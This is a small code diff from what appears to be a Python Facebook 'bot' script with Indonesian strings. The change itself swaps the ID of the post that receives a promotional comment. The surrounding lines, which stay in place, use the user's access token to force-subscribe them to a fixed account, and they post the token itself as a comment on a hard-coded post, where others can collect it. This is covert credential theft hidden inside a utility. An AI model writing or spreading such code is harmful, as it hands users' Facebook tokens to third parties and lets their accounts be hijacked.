@@ -123,7 +123,7 @@ def bot():
 	kom = ("Gantengnya Ramdani 😍")
 	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + kom + '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/315723919935349/comments/?message=' + kom + '&access_token=' + toket)
 	menu()
 
 ###### MENU ######
